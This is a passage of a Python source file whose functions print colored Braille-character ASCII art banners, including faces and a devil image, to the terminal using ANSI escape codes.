    ⣿⣿⣿⣿⣧⢻⣷⣝⢿⡿⠟⢋⠠⡀⠆⡀⠅⠀⠠⠉⠤⢒⣤⣾⣿⣿⣿⣿⣷⠮⠣⢹⡫⠪⠾⣿⣿⣿⣿⣿⣦⡐⢡⠤⠁⠀⠀⠇⠀⠆⠀⣉⠛⢿⣿⢟⣵⡿⣱⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣷⠙⢋⠁⡐⢂⡁⢆⠁⠢⠁⠠⣔⣡⣴⢾⣛⣿⣭⣿⣶⣾⣿⣿⣿⡷⠈⠾⣿⣿⣿⣿⣶⣾⣯⣽⣛⡷⢦⣤⣐⠄⠁⠈⠰⡁⠄⡔⢂⠄⣉⠛⢽⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⠁⠐⠈⠐⠄⠀⠘⠀⠠⢪⡴⡟⣯⣵⣾⣿⢿⠛⡿⠍⠙⠒⠚⠛⠋⠉⠛⠋⠙⠛⠓⠒⠚⠩⠽⠛⠻⢿⣿⣾⣽⢻⢶⡕⠠⠀⠊⠐⠁⠒⠠⠰⠀⢻⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⡇⡀⠀⠀⠀⠐⠀⠀⡌⠁⣸⣴⡿⡟⣏⣧⡼⠞⠁⠀⠀⡀⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠈⠑⠾⣼⣉⢻⢿⣾⣌⡆⠰⠀⠠⠀⠀⠁⠀⠀⠸⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⡇⠠⡠⡀⠢⠠⠄⡄⡀⣾⡿⣣⣴⣿⣿⠟⠀⠀⣰⠀⠘⢸⠇⠀⠠⠐⢀⠂⠄⢀⠂⠀⠰⡷⠃⠀⢠⠘⠢⡘⢿⣿⣾⣼⢻⣿⢰⢀⠄⠄⠄⢂⠔⡄⠀⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⡇⠀⡃⠎⡓⠦⢄⣒⠐⠙⠿⣮⣻⠿⠃⠀⠀⠑⣼⡀⠄⢀⠀⣠⠁⡈⠄⡐⠈⠠⠀⢄⠀⠀⠠⠀⣼⢁⠀⠈⢊⠻⡿⣫⡾⠟⠈⣀⡢⢥⢒⡑⠆⡀⢸⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⡀⠁⠆⡁⢎⠅⣒⠂⠎⡡⢀⠖⡀⠠⠌⠀⡀⠀⠀⠀⢂⢲⡇⠠⠐⠠⠀⡁⢂⠁⢸⣦⠅⠂⠀⠈⠀⠀⠈⡄⠈⠒⡄⠨⡙⠄⢎⠂⡥⠠⠙⠀⠀⣼⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⢇⡀⠀⠠⠘⠈⠆⡚⣈⠡⠎⡰⢁⠎⠱⣘⠂⢎⣐⠠⡀⢞⣷⠀⠌⡀⢁⠀⢂⠈⣼⡻⢘⠠⢢⢘⡀⠍⠦⠘⡌⢡⠘⣅⢒⠩⡀⠇⠰⠈⠀⠀⣰⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⡿⣣⣿⣟⣤⣀⠀⠀⠀⠀⠀⠊⠐⠁⡁⢌⠳⠀⡜⠢⠠⡜⣨⠢⡈⠀⠠⠐⠠⢈⠀⠀⢉⠔⠥⡩⢄⠊⠴⣈⠡⣃⠐⠌⠂⠐⠀⠀⠀⠀⠀⣀⣤⡺⣿⣮⢿⣿⣿⣿⣿
    ⣿⣿⡿⣱⣿⢏⣾⣿⣿⣿⣷⣶⣤⠀⠀⠀⠀⠈⠀⠴⠑⡈⢆⠳⠘⡀⡔⡊⠄⠠⠁⠂⠄⡈⢀⢂⠣⡄⡑⠪⡔⡈⠂⠱⠀⠀⠀⠀⠀⢀⢠⣶⣶⣿⣿⣿⣿⡝⣿⣧⣻⣿⣿⣿
    ⣿⡿⣵⣿⢯⣿⣿⡿⠿⣿⣿⣿⡇⠀⠁⠀⠀⠀⠀⠀⠁⢈⡄⢆⠣⠜⠀⡔⡘⠀⠠⠁⠂⠀⡄⠡⠘⠰⢌⡐⠤⡁⠉⠀⠀⠀⠀⠀⠀⢸⡄⣿⣿⣿⡿⠿⣿⣿⣞⣿⣷⢻⣿⣿
    ⣿⣳⣿⢏⣿⣿⣿⡇⠀⠈⠛⠿⣧⠀⠀⠀⠀⠀⠀⠂⠈⠀⠀⠀⠒⠈⠃⠠⠁⠄⠀⠐⡀⠰⠀⠀⠉⠁⠂⠄⠠⠀⠄⠀⠂⠀⠀⠀⠀⠸⢰⡿⠛⠋⢀⢢⣿⣿⣿⡜⣿⣧⢿⣿
    ⣯⣿⡟⣾⣿⣿⣿⣿⣦⠈⠀⠄⠈⠀⠀⠀⠄⠠⠀⠐⠀⠀⠂⠐⠠⠒⠈⠀⠁⢀⠐⠀⡀⠀⠈⠀⠀⠃⠆⠀⠄⠀⠀⠂⠀⡀⠄⠂⠀⠀⡌⠀⠠⠠⣠⣿⣿⣿⣿⣿⣹⣿⡞⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠈⠠⠀⠂⠀⠐⠈⠀⢁⠀⠉⠐⠠⣀⠠⠀⠄⠂⡀⠂⠄⠀⠄⠁⠌⡐⠠⠀⠄⠀⠀⠠⠀⠒⠤⠀⠌⠐⠀⠰⠁⠠⠁⠀⣿⣿⣿⣿⣿⣿⣧⢿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⡀⠀⠀⠠⠀⡀⠐⠠⠈⠄⠁⠂⠄⠁⢀⠈⠀⠄⠁⡀⠈⠀⡀⠄⠀⠄⠀⡀⠄⠁⠂⠁⠂⠄⠂⢀⠀⡈⠂⠀⠀⠀⡆⣿⣿⣿⣿⣿⣿⣿⣼⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠠⠀⠀⠀⠐⠀⠠⠀⠀⠀⠈⠀⠄⠁⠂⡀⠂⠄⡁⢀⠐⡀⠄⠂⡐⢀⠂⢄⠔⠊⠁⠁⠀⠠⠀⠀⡀⢠⠁⠀⠠⠀⢡⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠄⠂⠀⠐⠠⠀⠀⠀\033[31m⢀⣠⡄⣠\033[0m⢀⠁⠒⠂⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀\033[31m⣠⣠⡤⣀\033[0m⠀⠀⠀⠀⠀⡇⠀⢀⠀⢡⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⡀⠀⠠⠀⠀⠀⠀\033[31m⣿⣿⡃⣟⣳⣧\033[0m⠀⠀⠀⠀⢀⠀⠠⡀⠀⠀⠀\033[31m⢴⣿⣻⢛⣻⣷\033[0m⠀⠀⠀⠀⠃⡇⠀⠀⡄⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠄⠀⠀⠀⠀\033[31m⠉⠉⠉⠉\033[0m⠀⠀⠀⠀⠀⡀⠄⠐⠇⠈⠀⠀⠀\033[31m⠈⠉⠈⠉⠁\033[0m⠀⠀⠀⠀⡀⠁⠀⠀⠁⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⡀⠀⠀⡈⠀⠀⠀⠐⢀⡈⠀⠀⠀⠀⠀⠄⠈⠀⠀⠀⠀⠡⠀⠄⠂⡀⠀⠀⠈⠀⠠⠔⠀⠀⠀⠀⠈⢳⠄⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠐⠀⠌⠀⠂⠄⠀⠄⢂⠠⠁⠌⠀⠀⠀⠀⠀⠀⠀⠈⡀⠀⠄⡁⠄⠠⢀⠀⢐⡀⠁⠀⠊⠀⢜⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠐⠈⢀⠀⠀⠀⠀⠀⠀⠀⠀⢁⠠⠐⠐⠋⠀⠀⠀⠀⠀⠀⠀⣱⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⣿⣿⣿
    ⣿⣿⣷⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣵⠀⠀⠀⠀⠀⠀⠀⢁⠠⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⢶⣝⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣼⣿⣻⣿
    ⣿⣿⣿⣧⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣵⣟⣷⣷⠀⠈⠀⡄⠈⠀⠀⡀⠄⠀⢀⠀⠀⡀⠀⠄⠈⠀⢄⠀⢀⢰⠀⠈⠀⣼⣮⡻⣯⡻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣱⣿⢏⣿⣿
    ⣿⣿⡝⣿⣧⢿⣿⣿⣿⣿⣿⣿⢟⣯⡿⣫⣾⣿⣿⡇⠀⠀⠃⣽⡄⣼⠀⡄⠈⠀⠀⠁⠀⢠⠀⢠⡀⣴⠀⣾⠇⠀⠀⠀⣿⣿⣿⣮⣻⣮⡻⣿⣿⣿⣿⣿⣿⡿⣱⣿⢏⣾⣿⣿
    ⣿⣿⣿⣞⢿⣷⡻⣿⡿⢟⣫⣵⣿⣿⣹⣿⣿⣿⣿⡇⠀⠀⠀⠈⠀⣿⠐⣿⢀⡆⣤⠀⣠⠈⠀⣼⠁⢻⣦⠉⠀⠀⠂⠀⣿⣿⣿⣿⣷⢻⣿⣷⣽⣻⠿⣿⡟⣵⣿⢯⣾⣿⣿⣿
    ⣿⣿⣿⣿⣮⢿⣿⣕⢶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣧⠀⠀⡀⠀⡘⢥⠀⠛⢸⢇⣿⡀⣿⡆⠀⠙⠀⢸⠀⠀⠀⠀⠁⣸⣿⣿⣿⢿⣷⣶⣶⣶⣶⣶⣶⢦⣾⡿⣣⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣧⡹⣿⣧⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠘⡀⠀⠀⠀⠀⠈⠙⠀⠛⠁⠀⠀⠀⠀⢀⢣⠀⠈⢠⣿⣿⠋⠀⠀⠀⠉⢻⣿⣿⠟⣡⣿⠟⣹⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣷⣌⢻⣷⣼⣿⣿⠛⠛⢻⡟⣿⡟⢻⡗⠀⢀⠀⠐⣆⣄⠀⠀⠀⠀⠀⠀⡀⢀⠀⢀⠀⠂⠁⠀⡄⡘⠛⠃⠀⠊⠙⡗⠀⠀⠛⣡⣾⣿⣡⣾⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣷⣝⢿⣿⣯⡳⢶⣯⣝⢿⣿⣿⡏⣆⡀⠄⡀⠇⠻⡆⢄⡀⠀⠀⠀⢀⠀⠣⡀⠡⠀⠀⠌⣰⣶⣿⣿⣦⠀⣠⣿⠆⢸⢸⡿⣫⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⡻⢿⣷⣽⣻⢿⣮⣻⣧⣋⣶⠀⠠⠀⠘⠃⠘⠇⢹⠃⡿⠀⠀⠠⠘⢄⠀⠀⠈⠙⢏⣿⢟⣵⢟⢉⣷⠁⠀⣨⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣭⣻⢿⣿⣾⣽⣹⣿⡳⣷⠀⠐⡀⢂⠐⠀⡀⢀⠁⠠⠀⠀⡀⠄⠑⠀⠁⢀⠙⠧⣽⣾⣿⠟⠁⢀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⡿⢿⣿⣿⣿⣿⣾⣽⢻⡿⢿⣿⣾⣯⣤⣄⡂⠌⠠⠐⠠⠈⠄⠁⠂⣀⡀⠀⠡⠐⡀⢀⠀⠄⠀⡀⠠⡀⢀⣾⠿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⢟⣵⣿⣿⣿⣷⢹⣿⣿⣿⡿⣱⡟⣽⣷⣮⢿⣟⢿⣛⣛⣿⣿⣿⣿⣿⣿⣿⣟⣛⣻⡧⣦⣄⣐⡀⠠⠈⠐⢀⣁⣴⡿⣵⣿⣿⣿⣷⡝⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⡟⣾⣿⡟⣵⣿⣷⣼⣿⣿⡿⣽⢟⣾⣿⣿⣿⣷⡻⣯⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣾⢏⣾⣿⣿⣿⡝⣷⡻⣿⣿⣷⣵⣿⣾⣽⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣷⢻⣿⣧⡻⣿⣿⣿⡿⣟⣾⢯⣾⣿⣿⣿⣿⣿⣷⡽⣷⡻⣿⣿⣿⣿⣿⣿⣿⣿⢯⣾⣫⣿⣿⣿⣿⣿⣿⣞⢿⣝⢿⣿⣿⣿⡿⣻⣿⣿⣸⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣯⡻⣿⣿⣶⣯⣽⣾⣿⣳⣿⣿⣿⣿⣿⣿⣿⣿⣿⣜⣿⣝⣿⣿⣿⣿⣿⡿⣳⡿⣳⣿⣿⣿⣿⣿⣿⣿⣿⣮⡻⣿⣾⣭⣷⣿⣿⡿⣳⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣽⣟⣻⣯⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣎⢿⣞⢿⣿⣿⡟⣵⡿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣭⣿⣻⣿⣽⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣻⣯⣻⢟⣾⢟⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡹⣷⣿⢯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡝⣳⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    """
    )


def multi_banner():
    print(
        "            \033[93m⣀⣤⠶⠖⢛⣻⡿\033[31m                         ⣀⡔                 "
    )
    print(
        "            \033[93m ⢠⣶⣋⣩⣤⠶⠾⣿⡁\033[31m                 ⢀⣀⣴⣿⠋                "
    )
    print(
        "            \033[93m ⠈⠉⠉\033[97m⣠⣴⣾⣿⣿⣿⣷⣄              \033[91m⣴⣿⣿⣿⣿⣿⣷\033[31m⣤⣀⣀⡤"
    )
    print(
        "            \033[97m  ⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧    ⢀⣠⣴⣶⡇  \033[91m⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏              "
    )
    print(
        "            \033[97m  ⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆ ⣠⣶⣿⣿⣿⣿⠃  \033[91m⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿              "
    )
    print(
        "            \033[97m  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⠃  \033[91m⢠⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿              "
    )
    print(
        "            \033[97m  ⣿⣿⣿⣿⣿⡿⣫⣷⣾⣿⣿⣿⣿⣿⣿⣿⡏   \033[91m⢠⣿⣿⣿⣿⣿⣿⣯⡻⣿⣿⣿⣿⣿              "
    )
    print(
        "          \033[97m   ⢀⣿⣿⣿⣿⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟    \033[91m⣼⣿⣿⣿⣿⣿⣿⣿⣿⣞⣿⣿⣿⣿⡄             "
    )
    print(
        "          \033[97m   ⢪⣿⣿⢟⣽⣿⣿⡿⣫⣽⣿⣿⣿⣿⣿⡟    \033[91m⢠⣿⣿⣿⣿⣿⣿⣯⡻⣿⣿⣷⣝⠿⣿⣏             "
    )
    print(
        "         \033[97m    ⢹⣫⣶⣿⣿⡿⣫⣾⣿⣿⣿⣿⣿⣿⣿⡁⡀  \033[91m⢠⣀⣿⣿⣿⣿⣿⣿⣿⣿⣮⡻⣿⣿⣷⣮⣃             "
    )
    print(
        "      \033[97m   ⢀⣠⣤⣶⣿⣿⡿⠟⢭⣾⡿⣻⣿⣿⣿⣿⣿⣿⣿⡟⠁   \033[91m⢹⣿⣿⣿⣿⣿⣿⣿⣯⣻⠿⠮⠙⠿⣿⣿⣿⣶⣤⣄⡀        "
    )
    print(
        "     \033[97m⣀⣤⣶⣿⡿⠿⠿⠿⢛⠋   ⠐⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃    \033[91m⢈⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃  ⣀⣈⣙⣛⣛⣻⠿⠿⢿⣶⣤⣀    "
    )
    print(
        "  \033[97m⢀⣴⣿⠟⠉ ⣰⣾⣿⣿⣿⣿⣿⡿⣷⣦⡀⠈⠿⣿⣿⣿⣿⣿⣿⣏⠁     \033[91m⢼⣿⣿⣿⣿⣿⣿⠛ ⣠⣶⡿⣿⣿⣿⣿⣿⣿⣿⣆  ⠹⣿⣷⣄  "
    )
    print(
        " \033[97m⣴⣿⡿⠋   ⢿⣿⡿⣿⣿⣿⣿⣿⣮⣟⢿⣦⣴⣿⣿⣿⣿⣿⡏⠃      \033[91m⠘⢸⣿⣿⣿⣿⣿⣷⣾⠟⣫⣾⣿⣿⣿⣿⡿⣟⣿⡿   ⠈⠻⣿⣧⡀"
    )
    print(
        "\033[97m⢊⢼⠟     ⠘⢿⣿⣮⣻⣿⣿⣿⣿⣿⣷⣽⣿⣿⣿⣿⣿⣿⡇        \033[91m⢸⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⢯⣾⣿⡿⠁     ⠹⠗⠈"
    )
    print(
        "      \033[97m   ⠈⠻⣿⣷⡹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇        \033[91m⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢫⣿⣿⠟          "
    )
    print(
        "     \033[97m      ⠹⣿⣷⡝⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿         \033[91m ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣣⣿⡿⠃           "
    )
    print(
        "     \033[97m       ⠈⢿⣿⣮⡻⣿⣿⣿⣿⣿⣿⣿⡿⠃         \033[91m ⣿⡿⣿⣿⣿⣿⣿⣿⡿⣫⣾⣿⠟⠁            "
    )
    print(
        "      \033[97m       ⢀⡟⣿⣿⣶⣽⡛⠛⠛⠛⠉           \033[31m⢰⣿⠃\033[91m ⠉⠉⠛⣫⣵⣿⣿⣿⢹⡄             "
    )
    print(
        "      \033[93m      ⢀⡾⣵⣿⣿⡿⣿⡟              \033[31m⣰⡿⠃     ⢹⡿⠿⣿⣿⣷⣻⣄⡀           "
    )
    print(
        "      \033[93m    ⠐⠚⣛⣼⣿⣿⡟⠂⢸⠁            \033[31m⢀⣾⠏        ⡇⠘⠹⣿⣿⣷⣍⣙⠃          "
    )
    print(
        "      \033[93m    ⠒⠛⠛⠛⠛⠋  ⠘             \033[31m⢾⣇     ⣀⣠⣤⠴⠗⠚⠛⠛⣯⠉⠉⠉⠉          "
    )
    print("                                \033[31m⠈⠛⠷⠶⠖⠛⠋⠉⠁⣀ ⢀⣀⣠⡴⠟              ")
    print(
        "                                \033[31m      ⠉⠛⠻⠿⡍⠉⠁                 \033[97m"
    )


def multi_manner():
    print(
        "            \033[93m       \033[31m                         ⣀⡔                 "
    )
    print(
        "            \033[93m          \033[31m                 ⢀⣀⣴⣿⠋                "
    )
    print(
        "            \033[93m    \033[97m                      \033[91m⣴⣿⣿⣿⣿⣿⣷\033[31m⣤⣀⣀⡤"
    )
    print(
        "            \033[97m                        \033[91m⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏              "
    )
    print(
        "            \033[97m                        \033[91m⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿              "
    )
    print(
        "            \033[97m                       \033[91m⢠⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿              "
    )
    print(
        "            \033[97m                      \033[91m⢠⣿⣿⣿⣿⣿⣿⣯⡻⣿⣿⣿⣿⣿              "
    )
    print(
        "          \033[97m                        \033[91m⣼⣿⣿⣿⣿⣿⣿⣿⣿⣞⣿⣿⣿⣿⡄             "
    )
    print(
        "          \033[97m                       \033[91m⢠⣿⣿⣿⣿⣿⣿⣯⡻⣿⣿⣷⣝⠿⣿⣏             "
    )
    print(
        "         \033[97m                    ⡀  \033[91m⢠⣀⣿⣿⣿⣿⣿⣿⣿⣿⣮⡻⣿⣿⣷⣮⣃             "
    )
    print(
        "      \033[97m                           \033[91m⢹⣿⣿⣿⣿⣿⣿⣿⣯⣻⠿⠮⠙⠿⣿⣿⣿⣶⣤⣄⡀        "
    )
    print(
        "     \033[97m                            \033[91m⢈⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃  ⣀⣈⣙⣛⣛⣻⠿⠿⢿⣶⣤⣀    "
    )
    print(
        "  \033[97m                                \033[91m⢼⣿⣿⣿⣿⣿⣿⠛ ⣠⣶⡿⣿⣿⣿⣿⣿⣿⣿⣆  ⠹⣿⣷⣄  "
    )
    print(
        " \033[97m                                 \033[91m⠘⢸⣿⣿⣿⣿⣿⣷⣾⠟⣫⣾⣿⣿⣿⣿⡿⣟⣿⡿   ⠈⠻⣿⣧⡀"
    )
    print(
        "\033[97m                                   \033[91m⢸⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⢯⣾⣿⡿⠁     ⠹⠗⠈"
    )
    print(
        "      \033[97m                             \033[91m⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢫⣿⣿⠟          "
    )
    print(
        "     \033[97m                              \033[91m ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣣⣿⡿⠃           "
    )
    print(
        "     \033[97m                              \033[91m ⣿⡿⣿⣿⣿⣿⣿⣿⡿⣫⣾⣿⠟⠁            "
    )
    print(
        "      \033[97m                             \033[31m⢰⣿⠃\033[91m ⠉⠉⠛⣫⣵⣿⣿⣿⢹⡄             "
    )
    print(
        "      \033[93m                            \033[31m⣰⡿⠃     ⢹⡿⠿⣿⣿⣷⣻⣄⡀           "
    )
    print(
        "      \033[93m                          \033[31m⢀⣾⠏        ⡇⠘⠹⣿⣿⣷⣍⣙⠃          "
    )
    print(
        "      \033[93m                          \033[31m⢾⣇     ⣀⣠⣤⠴⠗⠚⠛⠛⣯⠉⠉⠉⠉          "
    )
    print("                                \033[31m⠈⠛⠷⠶⠖⠛⠋⠉⠁⣀ ⢀⣀⣠⡴⠟              ")
    print(
        "                                \033[31m      ⠉⠛⠻⠿⡍⠉⠁                 \033[97m"
    )


def multi_major():
    print("            \033[93m⣀⣤⠶⠖⢛⣻⡿\033[31m                    ")
    print("            \033[93m ⢠⣶⣋⣩⣤⠶⠾⣿⡁\033[31m                 ")
    print("            \033[93m ⠈⠉⠉\033[97m⣠⣴⣾⣿⣿⣿⣷⣄              ")
    print("            \033[97m  ⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧    ⢀⣠⣴⣶⡇ ")
    print("            \033[97m  ⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆ ⣠⣶⣿⣿⣿⣿⠃  ")
    print("            \033[97m  ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⠃  ")
    print("            \033[97m  ⣿⣿⣿⣿⣿⡿⣫⣷⣾⣿⣿⣿⣿⣿⣿⣿⡏  ")
    print("          \033[97m   ⢀⣿⣿⣿⣿⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟    ")
    print("          \033[97m   ⢪⣿⣿⢟⣽⣿⣿⡿⣫⣽⣿⣿⣿⣿⣿⡟    ")
    print("         \033[97m    ⢹⣫⣶⣿⣿⡿⣫⣾⣿⣿⣿⣿⣿⣿⣿⡁⡀ ")
    print("      \033[97m   ⢀⣠⣤⣶⣿⣿⡿⠟⢭⣾⡿⣻⣿⣿⣿⣿⣿⣿⣿⡟⠁  ")
    print("     \033[97m⣀⣤⣶⣿⡿⠿⠿⠿⢛⠋   ⠐⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃    ")
    print("  \033[97m⢀⣴⣿⠟⠉ ⣰⣾⣿⣿⣿⣿⣿⡿⣷⣦⡀⠈⠿⣿⣿⣿⣿⣿⣿⣏⠁  ")
    print(" \033[97m⣴⣿⡿⠋   ⢿⣿⡿⣿⣿⣿⣿⣿⣮⣟⢿⣦⣴⣿⣿⣿⣿⣿⡏⠃    ")
    print("\033[97m⢊⢼⠟     ⠘⢿⣿⣮⣻⣿⣿⣿⣿⣿⣷⣽⣿⣿⣿⣿⣿⣿⡇    ")
    print("      \033[97m   ⠈⠻⣿⣷⡹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇       ")
    print("     \033[97m      ⠹⣿⣷⡝⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿         ")
    print("     \033[97m       ⠈⢿⣿⣮⡻⣿⣿⣿⣿⣿⣿⣿⡿⠃       ")
    print("      \033[97m       ⢀⡟⣿⣿⣶⣽⡛⠛⠛⠛⠉          ")
    print("      \033[93m      ⢀⡾⣵⣿⣿⡿⣿⡟            ")
    print("      \033[93m    ⠐⠚⣛⣼⣿⣿⡟⠂⢸⠁         ")
    print("      \033[93m    ⠒⠛⠛⠛⠛⠋  ⠘     ")


def devil():
    clear_screen()
    time.sleep(0.02)
    print(
        """
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⠉⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⣹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡐⠀⠍⠻⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠠⠂⡠⠪⡻⣿⣿⣿⣿⣿⣿⠘⣿⢿⣿⣿⣿⣿⡟⡑⢁⠂⢄⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢀⠑⠠⢃⢳⢹⣿⣿⣿⣿⢏⢊⣏⢼⣿⣿⣿⡟⡼⢄⠣⡐⠄⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢀⠑⢊⠔⢊⡆⣿⣿⣿⣄⢻⢘⠷⣥⣿⣿⣿⡇⡅⢨⠒⠤⡀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
